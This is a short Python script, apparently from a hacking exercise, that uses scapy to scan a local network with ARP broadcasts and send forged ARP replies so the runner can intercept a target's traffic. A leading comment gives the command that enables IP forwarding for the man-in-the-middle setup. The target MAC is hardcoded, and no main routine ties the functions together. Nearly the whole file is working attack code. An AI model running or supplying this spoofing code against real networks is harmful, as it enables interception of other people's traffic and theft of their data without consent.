# To be able to be Man in the middle, we need to allow data to flow through our system with port forwarding.
# use command: echo 1 > /proc/sys/net/ipv4/ip_forward
import scapy.all as scapy
import argparse


def scan(ip_addr):  # ARP request on an IP range
    arp_request = scapy.ARP(pdst=ip_addr)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    client_list = []
    for answer in answer_list:
        client_dict = {"ip": answer[1].psrc, "mac": answer[1].hwsrc}
        client_list.append(client_dict)
    return client_list

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:e6:e5:59", psrc=spoof_ip)
    # op flag: 1 = arp request, 2 = arp response
    # hwdst is the MAC addr of the target
    scapy.send(packet)



def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target",help="the target's IP address")
    parser.add_argument("-s","--spoof",dest="spoof",help="the IP you want to spoof as")
    options = parser.parse_args()
    if not options.target:
        print("[-] Please enter a target IP address. Use --help for more information")
    elif not options.spoof:
        print("[-] Please enter the IP you wan to spoof as. Use --help for more information")
    return options

